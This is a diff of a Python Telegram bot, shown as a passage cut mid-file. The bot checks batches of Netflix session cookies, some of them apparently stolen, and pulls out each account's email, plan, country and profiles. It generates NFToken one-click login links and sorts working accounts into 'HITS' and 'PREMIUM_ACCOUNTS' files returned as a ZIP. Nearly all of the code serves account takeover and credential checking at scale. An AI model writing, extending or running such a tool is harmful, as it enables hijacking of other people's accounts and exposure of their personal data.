+                result["error"] = "No Netflix cookies found"
+                return result
+            cookies = cookies_dict_from_netscape(netscape)
+            if not cookies:
+                result["error"] = "Missing required Netflix cookies"
+                return result
 
-            if idx % 3 == 0 or idx == total:
-                await self._update_progress(status_msg, idx, total, valid, invalid, errors,
-                                             source_desc, mode, start_time)
+            session = requests.Session()
+            session.cookies.update(cookies)
 
-            await asyncio.sleep(0)
+            # Use a proxy if configured (skip for now)
+            _, _, info = get_account_page(session)
 
-        elapsed = time.time() - start_time
-        del self.active_tasks[user_id]
+            if not info or not info.get("countryOfSignup"):
+                result["error"] = "Incomplete account page (maybe cookies expired)"
+                return result
 
-        final_text = (
-            f"✅ **Done**\n\n"
-            f"Duration: {elapsed:.1f}s\n"
-            f"Total items: {total}\n"
-            f"✅ Valid: {valid}\n"
-            f"❌ Invalid: {invalid}\n"
-            f"⚠️ Errors: {errors}\n\n"
-            f"Detailed report attached below."
+            is_subscribed = info.get("membershipStatus") == "CURRENT_MEMBER"
+            plan_key, plan_label = derive_plan_info(info, is_subscribed)
+            country = info.get("countryOfSignup")
+            email = info.get("email")
+            profiles = info.get("profilesDisplay")
+
+            # Generate NFToken only if subscribed and enabled
+            nftoken_data = None
+            if is_subscribed and get_nftoken_mode(self.config) != "false":
+                nftoken_data, nftoken_err = create_nftoken(cookies, self.config["retries"]["nftoken_attempts"])
+                if nftoken_err:
+                    result["error"] = f"NFToken: {nftoken_err}"
+            # Format output
+            formatted = format_cookie_file(info, netscape, self.config, is_subscribed, nftoken_data)
+            result.update({
+                "success": True,
+                "is_subscribed": is_subscribed,
+                "plan_key": plan_key,
+                "plan_label": plan_label,
+                "country": country,
+                "email": email,
+                "profiles": profiles,
+                "token": nftoken_data.get("token") if nftoken_data else None,
+                "formatted_output": formatted,
+                "processing_time": time.time() - start,
+            })
+            self.update_stats(True, plan_key == "premium", None, result["processing_time"])
+        except Exception as e:
+            result["error"] = str(e)
+            self.update_stats(False, False, "exception", time.time() - start)
+            logging.error(traceback.format_exc())
+        return result
+
+    async def process_batch(self, items: List[str], mode: str) -> List[Dict]:
+        """Process list of cookie strings, return results"""
+        results = []
+        # Use ThreadPoolExecutor for concurrency
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS)
+        loop = asyncio.get_event_loop()
+        tasks = []
+        for cookie_text in items:
+            tasks.append(loop.run_in_executor(executor, asyncio.run, self.check_single_cookie(cookie_text)))
+        results = await asyncio.gather(*tasks)
+        executor.shutdown()
+        return results
+
+    # ------------------------------
+    # Telegram Handlers
+    # ------------------------------
+    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        keyboard = [
+            [InlineKeyboardButton("🔑 Token Only", callback_data="mode_tokenonly")],
+            [InlineKeyboardButton("📊 Full Info", callback_data="mode_fullinfo")],
+            [InlineKeyboardButton("⚡ Batch Mode", callback_data="batch")],
+            [InlineKeyboardButton("📈 Stats", callback_data="stats")],
+            [InlineKeyboardButton("❓ Help", callback_data="help")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        msg = (
+            f"🎬 **Netflix Cookie Checker Bot v{BOT_VERSION}**\n\n"
+            "Send me a cookie file or text, and I'll check the account status.\n\n"
+            "Supported formats:\n"
+            "• Netscape cookies\n"
+            "• JSON cookies\n"
+            "• Raw header strings\n"
+            "• Email:password (experimental)\n\n"
+            "Choose a mode below:"
         )
-        await status_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN)
-
-        report = io.StringIO()
-        report.write("NETFLIX BATCH PROCESSING REPORT\n")
-        report.write("=" * 50 + "\n\n")
-        report.write(f"Source: {source_desc}\n")
-        report.write(f"Mode: {mode}\n")
-        report.write(f"Total: {total}, Valid: {valid}, Invalid: {invalid}, Errors: {errors}\n")
-        report.write(f"Duration: {elapsed:.1f}s\n\n")
-        for i, r in enumerate(results, 1):
-            status = "✅" if r.success else "❌"
-            report.write(f"{i}. {status} {r.source_file or 'unknown'}: {r.token or r.error}\n")
-        report.seek(0)
-        await update.message.reply_document(
-            document=io.BytesIO(report.getvalue().encode()),
-            filename=f"batch_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
-            caption="📁 Full batch report"
-        )
-
-    @staticmethod
-    async def _update_progress(status_msg, current, total, valid, invalid, errors,
-                                source_desc, mode, start_time):
-        percent = (current / total) * 100 if total else 0
-        bar_length = 10
-        filled = int(bar_length * percent / 100)
-        bar = '█' * filled + '░' * (bar_length - filled)
-
-        elapsed = time.time() - start_time
-        text = (
-            f"**Processing Progress**\n\n"
-            f"Mode: {mode} ({source_desc})\n"
-            f"Total Items: {total}\n"
-            f"Progress: [{bar}] {percent:.1f}%\n"
-            f"Processed: {current}/{total}\n"
-            f"✅ Valid: {valid}\n"
-            f"❌ Invalid: {invalid}\n"
-            f"⚠️ Errors: {errors}\n"
-            f"⏱️ Elapsed: {elapsed:.1f}s\n\n"
-            f"Use /cancel to stop this task"
-        )
-        await status_msg.edit_text(text, parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text(msg, reply_markup=reply_markup)
 
     async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         await query.answer()
-
-        if query.data == "tokenonly":
-            context.user_data['mode'] = 'tokenonly'
+        data = query.data
+        if data == "mode_tokenonly":
+            context.user_data["mode"] = "tokenonly"
             await query.edit_message_text(
-                "🔑 **Token Only Mode Activated**\n\nSend me cookies!",
-                parse_mode=ParseMode.MARKDOWN
+                "🔑 **Token Only Mode**\n\nSend me cookies – I'll reply with the NFToken link.",
+                
             )
-        elif query.data == "fullinfo":
-            context.user_data['mode'] = 'fullinfo'
+        elif data == "mode_fullinfo":
+            context.user_data["mode"] = "fullinfo"
             await query.edit_message_text(
-                "📊 **Full Info Mode Activated**\n\nSend me cookies!",
-                parse_mode=ParseMode.MARKDOWN
+                "📊 **Full Info Mode**\n\nSend me cookies – I'll reply with detailed account info and token.",
+                
             )
-        elif query.data == "batch":
-            mode = context.user_data.get('mode', 'tokenonly')
-            context.user_data['batch_mode'] = True
+        elif data == "batch":
+            context.user_data["batch_mode"] = True
             await query.edit_message_text(
-                f"📁 **Batch Mode Activated**\n"
-                f"📊 **Mode:** `{mode}`\n\n"
-                "Upload a .txt, .json, or .zip file, or send plain text (one item per line).\n"
-                "Use /cancel to stop.",
-                parse_mode=ParseMode.MARKDOWN
+                "📁 **Batch Mode**\n\nSend me a text file, JSON file, or plain text with one cookie per line.\nUse /cancel to stop.",
+                
             )
-        elif query.data == "stats":
-            stats = self.stats.get_stats_summary()
-            await query.edit_message_text(
-                f"📊 **Bot Statistics**\n\n"
-                f"👥 Users: `{stats['total_users']}`\n"
-                f"✅ Checks: `{stats['total_checks']}`\n"
-                f"📈 Success: `{stats['success_rate']:.1f}%`\n"
-                f"💎 Premium: `{stats['premium_accounts']}`\n"
-                f"⏱️ Uptime: `{stats['uptime']}`\n"
-                f"⚡ Avg: `{stats['avg_response_time']:.2f}s`",
-                parse_mode=ParseMode.MARKDOWN
-            )
-        elif query.data == "help":
+        elif data == "stats":
+            await query.edit_message_text(self.get_stats_summary())
+        elif data == "help":
             await query.edit_message_text(
                 "❓ **Help**\n\n"
-                "**Commands:**\n"
-                "/start - Main menu\n"
-                "/tokenonly - Fast token generation\n"
-                "/fullinfo - Detailed account info\n"
-                "/batch - Batch process files/text\n"
-                "/stats - Bot statistics\n"
-                "/cancel - Stop current task\n\n"
-                "**Supported Formats:**\n"
-                "• Netscape cookies\n"
-                "• Raw cookie strings\n"
-                "• JSON objects\n"
-                "• Header strings\n"
-                "• Email:Password\n"
-                "• ZIP archives\n\n"
-                "**Required Cookies:**\n"
-                "• NetflixId\n"
-                "• SecureNetflixId\n"
-                "• nfvdid (optional)",
-                parse_mode=ParseMode.MARKDOWN
+                "Commands:\n"
+                "/start – Main menu\n"
+                "/stats – Show statistics\n"
+                "/cancel – Cancel current batch\n\n"
+                "Supported cookie formats:\n"
+                "• Netscape .txt (cookie file)\n"
+                "• JSON (with cookies array)\n"
+                "• Header: `NetflixId=xxx; SecureNetflixId=yyy`\n"
+                "• Email:password (will attempt to extract NetflixId? Not fully supported)\n\n"
+                "The bot will return:\n"
+                "• Account details (if subscribed)\n"
+                "• NFToken (valid 1 hour)\n"
+                "• Direct login link\n\n"
+                "Note: For best results, use cookies exported from a browser extension.",
+                
             )
-        elif query.data == "cancel":
-            user_id = update.effective_user.id
-            if user_id in self.active_tasks:
-                self.active_tasks[user_id]['cancel'] = True
-            await query.edit_message_text("🛑 Cancellation requested.", parse_mode=ParseMode.MARKDOWN)
 
-    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        logging.error(f"Update {update} caused error {context.error}")
+    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        if user_id in self.active_tasks:
+            await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
+            return
+        doc = update.message.document
+        if not doc:
+            return
+        if doc.file_size > MAX_FILE_SIZE:
+            await update.message.reply_text(f"File too large. Max size: {MAX_FILE_SIZE//1024//1024}MB")
+            return
+        status_msg = await update.message.reply_text("📥 Downloading file...")
         try:
-            if update and update.effective_message:
-                error_msg = str(context.error)[:100] + "..."
-                await update.effective_message.reply_text(
-                    f"❌ An error occurred: `{error_msg}`\n\nPlease try again later.",
-                    parse_mode=ParseMode.MARKDOWN
+            file = await doc.get_file()
+            content = io.BytesIO()
+            await file.download_to_memory(content)
+            content.seek(0)
+            # Determine format and extract cookies
+            cookie_texts = []
+            if doc.file_name.endswith('.zip'):
+                with zipfile.ZipFile(content) as zf:
+                    for name in zf.namelist():
+                        if name.endswith(('.txt', '.json')):
+                            with zf.open(name) as f:
+                                text = f.read().decode('utf-8', errors='ignore')
+                                cookie_texts.append(text)
+            else:
+                text = content.read().decode('utf-8', errors='ignore')
+                # If multiple lines, treat each line as separate cookie
+                lines = text.splitlines()
+                if len(lines) > 1:
+                    cookie_texts.extend(lines)
+                else:
+                    cookie_texts.append(text)
+            if not cookie_texts:
+                await status_msg.edit_text("No valid cookie lines found.")
+                return
+            mode = context.user_data.get("mode", "fullinfo")
+            self.active_tasks[user_id] = {"cancel": False, "processed": 0, "total": len(cookie_texts)}
+            await self._process_batch(update, user_id, cookie_texts, mode, status_msg)
+        except Exception as e:
+            await status_msg.edit_text(f"Error reading file: {e}")
+        finally:
+            self.active_tasks.pop(user_id, None)
+
+    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+
+        if context.user_data.get("batch_mode", False):
+            context.user_data["batch_mode"] = False
+
+            if user_id in self.active_tasks:
+                await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
+                return
+
+            text = update.message.text
+            lines = [line.strip() for line in text.splitlines() if line.strip()]
+
+            if not lines:
+                await update.message.reply_text("No non-empty lines found.")
+                return
+
+            mode = context.user_data.get("mode", "fullinfo")
+            self.active_tasks[user_id] = {
+                "cancel": False,
+                "processed": 0,
+                "total": len(lines),
+            }
+
+            status_msg = await update.message.reply_text("📥 Starting batch...")
+            await self._process_batch(update, user_id, lines, mode, status_msg)
+            self.active_tasks.pop(user_id, None)
+            return
+
+        text = update.message.text
+        await update.message.chat.send_action(action="typing")
+
+        result = await self.check_single_cookie(text)
+        mode = context.user_data.get("mode", "fullinfo")
+
+        if result["success"]:
+            if mode == "tokenonly":
+                if result["token"]:
+                    msg = f"✅ Token Generated\n\nhttps://netflix.com/?nftoken={result['token']}\n\nExpires in 1 hour."
+                    await update.message.reply_text(msg, disable_web_page_preview=True)
+                else:
+                    await update.message.reply_text(f"❌ Token generation failed: {result['error']}")
+            else:
+                await update.message.reply_text(
+    result["formatted_output"],
+    disable_web_page_preview=True,
+    parse_mode=None
+)
+        else:
+            await update.message.reply_text(f"❌ Failed\n\nError: {result['error']}")
+
+    async def _process_batch(self, update: Update, user_id: int, items: List[str], mode: str, status_msg):
+        total = len(items)
+
+        import os, zipfile
+        base_dir = os.path.join(os.getcwd(), f"categorized_output_{user_id}")
+        os.makedirs(base_dir, exist_ok=True)
+
+        categories = {
+            "HITS": [],
+            "CC": [],
+            "EXTRA_MEMBER": [],
+            "HOLD": [],
+            "QUALITY": [],
+            "THIRD_PARTY": []
+        }
+        processed = 0
+        start_time = time.time()
+
+        valid = 0
+        premium = 0
+        bad = 0
+        retries = 0
+        fallback_proxies = 0
+
+        for idx, cookie_text in enumerate(items, 1):
+            if self.active_tasks[user_id].get("cancel", False):
+                await status_msg.edit_text("🛑 Batch cancelled.")
+                return
+
+            result = await self.check_single_cookie(cookie_text)
+            processed += 1
+
+            if result["success"]:
+                valid += 1
+
+                plan = result.get("plan_key", "").lower()
+
+                if plan == "premium":
+                    premium += 1
+                    categories["HITS"].append(result["formatted_output"])
+
+                if "cc" in str(result.get("formatted_output")).lower():
+                    categories["CC"].append(result["formatted_output"])
+
+                if "extra member" in str(result["formatted_output"]).lower():
+                    categories["EXTRA_MEMBER"].append(result["formatted_output"])
+
+                if "hd" in str(result["formatted_output"]).lower():
+                    categories["QUALITY"].append(result["formatted_output"])
+
+                if "third" in str(result["formatted_output"]).lower():
+                    categories["THIRD_PARTY"].append(result["formatted_output"])
+
+            else:
+                bad += 1
+                categories["HOLD"].append(str(result.get("error")))
+            self.active_tasks[user_id]["processed"] = processed
+
+            if mode == "tokenonly":
+                if result["success"] and result["token"]:
+                    msg = f"✅ Token\n\nhttps://netflix.com/?nftoken={result['token']}"
+                    await update.message.reply_text(msg, disable_web_page_preview=True)
+                else:
+                    await update.message.reply_text(f"❌ Failed: {result['error']}")
+            else:
+                if result["success"]:
+                    await update.message.reply_text(
+    result["formatted_output"],
+    disable_web_page_preview=True,
+    parse_mode=None
+)
+                else:
+                    await update.message.reply_text(f"❌ Failed: {result['error']}")
+
+            if idx % 3 == 0 or idx == total:
+                elapsed = time.time() - start_time
+                speed = idx / elapsed if elapsed > 0 else 0
+
+                prog_text = (
+                    "📊 Checking Netflix...\n\n"
+                    f"├ Checked: {idx}/{total}\n"
+                    f"├ ✅ Valid: {valid}\n"
+                    f"├ 🌟 Premium: {premium}\n"
+                    f"├ ❌ Bad: {bad}\n"
+                    f"├ ⚡ Speed: {speed:.1f}/s\n"
                 )
-        except:
-            pass
+                await status_msg.edit_text(prog_text)
+
+            await asyncio.sleep(0.2)
+
+        elapsed = time.time() - start_time
+        speed = total / elapsed if elapsed > 0 else 0
+
+        final_msg = (
+            "✅ Netflix Check Complete!\n\n"
+            "📊 Summary\n"
+            "──────────────────────────────\n"
+            f"├ Total: {total}\n"
+            f"├ ✅ Valid: {valid}\n"
+            f"├ 🌟 Premium: {premium}\n"
+            f"├ ❌ Bad: {bad}\n"
+            f"├ ⏱ Time: {elapsed:.1f}s\n"
+            f"├ ⚡ Speed: {speed:.1f}/s\n"
+            f"├ 🔍 Filter: premium\n"
+            f"├ 🧠 Mode: Proxyless → Proxy fallback\n"
+            f"├ 🌐 Fallback proxies: {fallback_proxies}\n"
+            f"├ 🔄 Error retries: {retries} cookie(s) re-checked\n"
+            "──────────────────────────────\n"
+            "By @Edwxrdee"
+        )
+
+        await status_msg.edit_text(final_msg)
+
+        # SAVE FILES + ZIP
+        for cat, items in categories.items():
+            if not items:
+                continue
+
+            folder = os.path.join(base_dir, cat)
+            os.makedirs(folder, exist_ok=True)
+
+            with open(os.path.join(folder, f"{cat}.txt"), "w") as f:
+                f.write("\n\n".join(items))
+
+        with open(os.path.join(base_dir, "PREMIUM_ACCOUNTS.txt"), "w") as f:
+            f.write("\n\n".join(categories["HITS"]))
+
+        with open(os.path.join(base_dir, "SUMMARY.txt"), "w") as f:
+            f.write(final_msg)
+
+        zip_path = os.path.join(os.getcwd(), f"categorized_hits_{user_id}.zip")
+
+        with zipfile.ZipFile(zip_path, "w") as z:
+            for root, dirs, files in os.walk(base_dir):
+                for file in files:
+                    full_path = os.path.join(root, file)
+                    z.write(full_path, os.path.relpath(full_path, base_dir))
+
+        await update.message.reply_document(open(zip_path, "rb"))
+    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        if user_id in self.active_tasks:
+            self.active_tasks[user_id]["cancel"] = True
+            await update.message.reply_text("🛑 Cancellation requested. Current item will finish then stop.")
+        else:
+            await update.message.reply_text("No active task to cancel.")
+
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await update.message.reply_text(self.get_stats_summary())
 
     def run(self):
         if not TELEGRAM_AVAILABLE:
-            print("=" * 60)
-            print("🎬 Netflix Token Generator Pro v{}".format(BOT_VERSION))
-            print("=" * 60)
-            print("\n✅ Code verification complete!")
-            print("   • Batch processing with live progress")
-            print("   • Multi-threading enabled")
-            print("   • Stats tracking active")
-            print("\n📊 Bot would be running with these stats:")
-            print(f"   • Users: {self.stats.get_stats_summary()['total_users']}")
-            print(f"   • Success Rate: {self.stats.get_stats_summary()['success_rate']:.1f}%")
-            print(f"   • Premium Found: {self.stats.get_stats_summary()['premium_accounts']}")
-            print("\n🚀 To run with Telegram:")
-            print("   pip install python-telegram-bot pytz pycountry")
-            print("   python netflix_bot.py")
+            print("Please install python-telegram-bot: pip install python-telegram-bot")
             return
 
-        self.application = Application.builder().token(self.token).build()
-        self.application.add_handler(CommandHandler("start", self.start))
-        self.application.add_handler(CommandHandler("tokenonly", self.tokenonly))
-        self.application.add_handler(CommandHandler("fullinfo", self.fullinfo))
-        self.application.add_handler(CommandHandler("stats", self.stats_command))
-        self.application.add_handler(CommandHandler("cancel", self.cancel))
-        self.application.add_handler(CommandHandler("batch", self.batch_command))
-        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_file))
-        self.application.add_handler(CallbackQueryHandler(self.button_callback))
-        self.application.add_error_handler(self.error_handler)
+        app = Application.builder().token(self.token).build()
+        app.add_handler(CommandHandler("start", self.start))
+        app.add_handler(CommandHandler("stats", self.stats_command))
+        app.add_handler(CommandHandler("cancel", self.cancel_command))
+        app.add_handler(MessageHandler(filters.Document.ALL, self.handle_file))
+        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
+        app.add_handler(CallbackQueryHandler(self.button_callback))
 
-        print("=" * 60)
-        print("🎬 Netflix Token Generator Pro v{} 🚀".format(BOT_VERSION))
-        print("=" * 60)
-        print(f"Release: {BOT_RELEASE_DATE}")
-        print(f"Bot Token: {self.token[:10]}...")
-        print(f"Max Threads: {MAX_THREADS}")
-        print(f"Max File Size: {MAX_FILE_SIZE//1024//1024}MB")
-        print(f"Request Timeout: {REQUEST_TIMEOUT}s")
-        print(f"Cache Size: {CACHE_SIZE}")
-        print("-" * 60)
-        print("Bot is running... Press Ctrl+C to stop")
-        print("=" * 60)
+        print("Bot is running...")
+        app.run_polling()
 
-        try:
-            self.application.run_polling(allowed_updates=Update.ALL_TYPES)
-        except KeyboardInterrupt:
-            print("\n👋 Shutting down...")
-        except Exception as e:
-            print(f"\n❌ Fatal error: {e}")
-            logging.error(traceback.format_exc())
-
-# ==================== MAIN ENTRY POINT ====================
-if __name__ == '__main__':
-    # Configure logging
-    logging.basicConfig(
-        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-        level=logging.DEBUG if DEBUG_MODE else logging.INFO,
-        handlers=[
-            logging.FileHandler('netflix_bot.log'),
-            logging.StreamHandler()
-        ]
-    )
-    
-    # Create and run bot
-    bot = NetflixTokenBot(TOKEN)
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO)
+    bot = NetflixCheckerBot(BOT_TOKEN)
     bot.run()
